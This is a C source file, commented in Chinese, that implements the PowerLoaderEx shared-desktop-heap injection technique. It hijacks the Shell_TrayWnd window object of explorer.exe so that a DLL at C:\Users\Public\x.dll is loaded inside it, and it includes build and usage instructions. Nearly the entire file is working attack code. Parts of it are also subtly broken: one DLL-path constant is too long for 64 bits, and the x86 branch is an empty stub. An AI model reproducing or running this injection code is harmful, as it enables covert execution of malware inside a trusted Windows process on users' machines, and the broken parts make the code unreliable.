/**
 * ===================================================================
 * PowerLoaderEx - 共享桌面堆代码注入
 * ===================================================================
 *
 * 技术原理：
 * 1. Windows 桌面窗口使用共享桌面堆（Shared Desktop Heap）存储窗口数据
 * 2. 所有进程都可以访问相同桌面的共享堆
 * 3. SetWindowLong/SetWindowLongPtr 可以写入窗口额外内存（cbWndExtra）
 * 4. 劫持 Shell_TrayWnd 窗口的 CTray 对象指针
 * 5. 发送消息触发执行恶意代码
 *
 * 技术优势：
 * - 无需 VirtualAllocEx/WriteProcessMemory
 * - 利用共享桌面堆跨进程通信
 * - 不需要读取目标进程内存
 * - 支持 x86 和 x64 架构
 *
 * 原始研究：BreakingMalware.com (~2013)
 * 参考：https://github.com/BreakingMalware/PowerLoaderEx
 * MITRE ATT&CK: T1055.011 (Extra Window Memory Injection)
 *
 * 编译：gcc powerloader_ex.c -o powerloader_ex.exe -lshlwapi -mwindows
 * 用法：powerloader_ex.exe
 *
 * ⚠️ 警告：此技术高度依赖 Windows 内部结构，仅在 Windows 7 测试
 * ===================================================================
 */

#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>
#include <psapi.h>
#include <shlwapi.h>

#pragma comment(lib, "shlwapi.lib")

// ========================================
// 常量定义
// ========================================

#define NUM_OF_MAGICS 4
#define MAX_WINDOW_EXTRA 0x200  // 窗口额外内存大小

// 魔数用于定位共享桌面堆
ULONG g_Magics[NUM_OF_MAGICS] = { 0xABABABAB, 0xCDCDCDCD, 0xABABABAB, 0xCDCDCDCD };

// ========================================
// 函数声明
// ========================================

BOOL InitializeWindow(HINSTANCE hInstance, HWND *phWnd);
PVOID FindDesktopHeap(HWND myWnd, SIZE_T *pMagicOffset, SIZE_T *pSize);
PVOID FindProcessDesktopHeap(HANDLE hProcess, SIZE_T heapSize);
DWORD GetExplorerPID();
PVOID BuildAttackBuffer(HWND window, PVOID explorerSharedHeap, SIZE_T windowBufferOffset);
BOOL InjectExplorer(HWND myWnd);
PBYTE SearchMemory(PBYTE start, SIZE_T size, PBYTE buffer, SIZE_T bufLen);

/**
 * ===================================================================
 * 主函数
 * ===================================================================
 */
int main() {
    printf("======================================\n");
    printf("  PowerLoaderEx - 共享桌面堆注入\n");
    printf("======================================\n\n");

    // 加载必需的 DLL
    LoadLibraryA("shell32.dll");

    // 创建窗口
    HWND hWnd = NULL;
    if (!InitializeWindow(GetModuleHandle(NULL), &hWnd)) {
        printf("[!] 无法创建窗口\n");
        return 1;
    }

    printf("[*] 窗口创建成功：HWND = 0x%p\n\n", hWnd);

    // 执行注入
    if (InjectExplorer(hWnd)) {
        printf("\n[+] PowerLoaderEx 注入成功！\n");
        printf("[*] 等待 1 秒...\n");
        Sleep(1000);
    } else {
        printf("\n[!] PowerLoaderEx 注入失败\n");
    }

    printf("\n======================================\n");
    printf("注入完成\n");
    printf("======================================\n");

    return 0;
}

/**
 * ===================================================================
 * 初始化窗口
 *
 * 创建一个带有额外内存的窗口，用于存储攻击载荷
 * ===================================================================
 */
BOOL InitializeWindow(HINSTANCE hInstance, HWND *phWnd) {
    WNDCLASSEXA wcex = {0};

    wcex.cbSize = sizeof(WNDCLASSEXA);
    wcex.style = CS_HREDRAW | CS_VREDRAW;
    wcex.lpfnWndProc = DefWindowProcA;
    wcex.cbClsExtra = 0;
    wcex.cbWndExtra = MAX_WINDOW_EXTRA;  // 关键：分配额外窗口内存
    wcex.hInstance = hInstance;
    wcex.hCursor = LoadCursor(NULL, IDC_ARROW);
    wcex.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);
    wcex.lpszClassName = "PowerLoaderExCls";

    if (!RegisterClassExA(&wcex)) {
        printf("[!] RegisterClassEx 失败：%lu\n", GetLastError());
        return FALSE;
    }

    *phWnd = CreateWindowA(
        "PowerLoaderExCls",
        "PowerLoaderEx",
        WS_OVERLAPPEDWINDOW,
        CW_USEDEFAULT, 0,
        CW_USEDEFAULT, 0,
        NULL, NULL,
        hInstance,
        NULL
    );

    return (*phWnd != NULL);
}

/**
 * ===================================================================
 * 内存搜索函数
 *
 * 在内存中搜索指定字节序列
 * ===================================================================
 */
PBYTE SearchMemory(PBYTE start, SIZE_T size, PBYTE buffer, SIZE_T bufLen) {
    while (size > bufLen) {
        if (memcmp(start, buffer, bufLen) == 0) {
            return start;
        }
        start++;
        size--;
    }
    return NULL;
}

/**
 * ===================================================================
 * 查找共享桌面堆（本进程）
 *
 * 步骤：
 * 1. 使用 SetWindowLong 写入魔数到窗口额外内存
 * 2. 遍历本进程内存，查找包含魔数的只读共享内存
 * 3. 返回共享桌面堆的基地址和魔数偏移
 * ===================================================================
 */
PVOID FindDesktopHeap(HWND myWnd, SIZE_T *pMagicOffset, SIZE_T *pSize) {
    MEMORY_BASIC_INFORMATION memInfo = {0};
    BYTE *addr = (BYTE*)0x1000;
    PBYTE tmp;
    ULONG oldProt = 0;

    printf("[1] 查找共享桌面堆\n");

    // 写入魔数到窗口额外内存
    for (UINT i = 0; i < NUM_OF_MAGICS; i++) {
        SetLastError(0);
        SetWindowLongA(myWnd, i * sizeof(ULONG), g_Magics[i]);
        if (GetLastError() != 0) {
            printf("[!] SetWindowLong 失败：%lu\n", GetLastError());
            return NULL;
        }
    }

    printf("    [*] 魔数已写入窗口：0x%08X 0x%08X 0x%08X 0x%08X\n",
           g_Magics[0], g_Magics[1], g_Magics[2], g_Magics[3]);

    // 遍历内存查找魔数
    while (VirtualQuery(addr, &memInfo, sizeof(memInfo))) {
        // 查找只读、共享映射的内存区域
        if (memInfo.Protect == PAGE_READONLY &&
            memInfo.Type == MEM_MAPPED &&
            memInfo.State == MEM_COMMIT) {

            tmp = SearchMemory(
                (PBYTE)memInfo.BaseAddress,
                memInfo.RegionSize,
                (PBYTE)g_Magics,
                sizeof(g_Magics)
            );

            if (tmp) {
                // 验证是否为只读（尝试改变保护）
                if (!VirtualProtect(addr, 0x1000, PAGE_READWRITE, &oldProt)) {
                    // 无法修改保护 = 共享桌面堆
                    *pSize = memInfo.RegionSize;
                    *pMagicOffset = (SIZE_T)tmp - (SIZE_T)memInfo.AllocationBase;

                    printf("    [+] 找到共享桌面堆：0x%p\n", memInfo.BaseAddress);
                    printf("        大小：%lu 字节\n", memInfo.RegionSize);
                    printf("        魔数偏移：0x%lX\n", *pMagicOffset);

                    return memInfo.BaseAddress;
                }
            }
        }
        addr += memInfo.RegionSize;
    }

    return NULL;
}

/**
 * ===================================================================
 * 查找目标进程的共享桌面堆
 *
 * 遍历目标进程内存，查找相同大小的只读共享映射区域
 * ===================================================================
 */
PVOID FindProcessDesktopHeap(HANDLE hProcess, SIZE_T heapSize) {
    BYTE *addr = (BYTE*)0x1000;
    MEMORY_BASIC_INFORMATION memInfo = {0};
    ULONG oldProt = 0;

    printf("[3] 查找 Explorer 共享桌面堆\n");

    while (VirtualQueryEx(hProcess, addr, &memInfo, sizeof(memInfo))) {
        if (memInfo.Protect == PAGE_READONLY &&
            memInfo.Type == MEM_MAPPED &&
            memInfo.State == MEM_COMMIT &&
            memInfo.RegionSize == heapSize) {

            // 双重检查：尝试改变保护
            if (!VirtualProtectEx(hProcess, addr, 0x1000, PAGE_READWRITE, &oldProt)) {
                printf("    [+] 找到 Explorer 共享桌面堆：0x%p\n", memInfo.BaseAddress);
                return memInfo.BaseAddress;
            } else {
                VirtualProtectEx(hProcess, addr, 0x1000, oldProt, &oldProt);
            }
        }
        addr += memInfo.RegionSize;
    }

    return NULL;
}

/**
 * ===================================================================
 * 获取 Explorer.exe 进程 ID
 * ===================================================================
 */
DWORD GetExplorerPID() {
    HANDLE hSnapshot;
    PROCESSENTRY32 pe32 = {0};
    DWORD pid = 0;

    printf("[2] 查找 Explorer.exe 进程\n");

    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        printf("[!] CreateToolhelp32Snapshot 失败\n");
        return 0;
    }

    pe32.dwSize = sizeof(PROCESSENTRY32);

    if (!Process32First(hSnapshot, &pe32)) {
        CloseHandle(hSnapshot);
        return 0;
    }

    do {
        if (_stricmp(pe32.szExeFile, "explorer.exe") == 0) {
            pid = pe32.th32ProcessID;
            printf("    [+] 找到 Explorer.exe，PID: %lu\n", pid);
            break;
        }
    } while (Process32Next(hSnapshot, &pe32));

    CloseHandle(hSnapshot);
    return pid;
}

/**
 * ===================================================================
 * 构建攻击缓冲区（x64 版本）
 *
 * x64 版本不需要 ROP 链，直接劫持回调函数
 * ===================================================================
 */
#ifdef _WIN64
PVOID BuildAttackBuffer(HWND window, PVOID explorerSharedHeap, SIZE_T windowBufferOffset) {
    PVOID loadLibraryAddr = (PVOID)GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA");
    UINT currIndex = 0;

    printf("[4] 构建攻击缓冲区（x64）\n");

    // 在共享堆中构建攻击数据
    #define SET_LONG(value) SetWindowLongPtrA(window, currIndex*8, (LONG_PTR)value);currIndex++;

    // 构建函数调用链
    SET_LONG((SIZE_T)explorerSharedHeap + windowBufferOffset + 0x10);
    SET_LONG(0);  // 必须为 0
    SET_LONG(0);  // 目标函数占位符
    SET_LONG(0);  // RET gadget 占位符
    SET_LONG(0);  // RET gadget 占位符
    SET_LONG((SIZE_T)explorerSharedHeap + windowBufferOffset + (currIndex+5)*8);  // 指向 DLL 路径
    SET_LONG(5);
    SET_LONG(6);
    SET_LONG(7);
    SET_LONG(loadLibraryAddr);  // LoadLibraryA 函数地址

    // 写入要加载的 DLL 路径（C:\Users\Public\x.dll）
    SET_LONG(0x73726573555C3A43ULL);  // "C:\Users"
    SET_LONG(0x5C6369636C6275505CULL);  // "\Public\"
    SET_LONG(0x0000006C6C642E78ULL);    // "x.dll\0\0\0"

    #undef SET_LONG

    printf("    [+] 攻击缓冲区构建完成\n");
    printf("        LoadLibraryA: 0x%p\n", loadLibraryAddr);
    printf("        目标 DLL: C:\\Users\\Public\\x.dll\n");

    return (PVOID)((SIZE_T)explorerSharedHeap + windowBufferOffset);
}
#else
/**
 * ===================================================================
 * 构建攻击缓冲区（x86 版本）
 *
 * x86 需要构建 ROP 链来执行 LoadLibrary
 * ===================================================================
 */
PVOID BuildAttackBuffer(HWND window, PVOID explorerSharedHeap, SIZE_T windowBufferOffset) {
    printf("[4] 构建攻击缓冲区（x86 + ROP 链）\n");
    printf("    [!] x86 ROP 链实现较复杂，此为简化版本\n");

    // x86 需要查找 gadget 并构建复杂的 ROP 链
    // 这里提供简化实现框架

    printf("    [!] x86 版本需要完整的 ROP 链实现\n");
    printf("    [!] 建议使用 x64 版本\n");

    return NULL;
}
#endif

/**
 * ===================================================================
 * 主注入函数
 *
 * 步骤：
 * 1. 查找本进程共享桌面堆
 * 2. 获取 Explorer.exe PID
 * 3. 查找 Explorer 共享桌面堆
 * 4. 构建攻击缓冲区
 * 5. 劫持 Shell_TrayWnd 窗口
 * 6. 触发执行
 * 7. 恢复原始状态
 * ===================================================================
 */
BOOL InjectExplorer(HWND myWnd) {
    BOOL ret = TRUE;
    PVOID desktopHeapBase = NULL;
    PVOID explorerDesktopHeap = NULL;
    SIZE_T sharedHeapSize = 0;
    SIZE_T windowBufferOffset = 0;
    HANDLE explorerHandle = NULL;
    DWORD pid = 0;
    PVOID oldCTrayObj = NULL;
    HWND hShellTrayWnd = NULL;

    // [1] 查找本进程共享桌面堆
    desktopHeapBase = FindDesktopHeap(myWnd, &windowBufferOffset, &sharedHeapSize);
    if (!desktopHeapBase) {
        printf("[!] 无法找到共享桌面堆\n");
        return FALSE;
    }

    // [2] 获取 Explorer.exe PID
    pid = GetExplorerPID();
    if (!pid) {
        printf("[!] 无法找到 Explorer.exe\n");
        return FALSE;
    }

    // 打开 Explorer 进程
    explorerHandle = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION, FALSE, pid);
    if (!explorerHandle) {
        printf("[!] 无法打开 Explorer 进程：%lu\n", GetLastError());
        return FALSE;
    }

    // [3] 查找 Explorer 共享桌面堆
    explorerDesktopHeap = FindProcessDesktopHeap(explorerHandle, sharedHeapSize);
    if (!explorerDesktopHeap) {
        printf("[!] 无法找到 Explorer 共享桌面堆\n");
        ret = FALSE;
        goto cleanup;
    }

    // [4] 查找 Shell_TrayWnd 窗口
    printf("[5] 查找 Shell_TrayWnd 窗口\n");
    hShellTrayWnd = FindWindowA("Shell_TrayWnd", NULL);
    if (!hShellTrayWnd) {
        printf("[!] 无法找到 Shell_TrayWnd 窗口\n");
        ret = FALSE;
        goto cleanup;
    }
    printf("    [+] 找到 Shell_TrayWnd：0x%p\n", hShellTrayWnd);

    // 获取原始 CTray 对象
    oldCTrayObj = (PVOID)GetWindowLongPtrA(hShellTrayWnd, 0);
    printf("    [*] 原始 CTray 对象：0x%p\n", oldCTrayObj);

    // [5] 构建攻击缓冲区
    PVOID maliciousCTrayObj = BuildAttackBuffer(myWnd, explorerDesktopHeap, windowBufferOffset);
    if (!maliciousCTrayObj) {
        printf("[!] 无法构建攻击缓冲区\n");
        ret = FALSE;
        goto cleanup;
    }

    // [6] 劫持 CTray 对象
    printf("[6] 劫持 Shell_TrayWnd 窗口对象\n");
    SetWindowLongPtrA(hShellTrayWnd, 0, (LONG_PTR)maliciousCTrayObj);
    printf("    [+] CTray 对象已替换为：0x%p\n", maliciousCTrayObj);

    // [7] 触发执行
    printf("[7] 发送 WM_PAINT 消息触发执行\n");
    SendNotifyMessageA(hShellTrayWnd, WM_PAINT, 0xABABABAB, 0);

    // 等待执行
    Sleep(1000);

    // [8] 恢复原始 CTray 对象
    printf("[8] 恢复原始 CTray 对象\n");
    SetWindowLongPtrA(hShellTrayWnd, 0, (LONG_PTR)oldCTrayObj);

cleanup:
    if (explorerHandle) {
        CloseHandle(explorerHandle);
    }

    return ret;
}
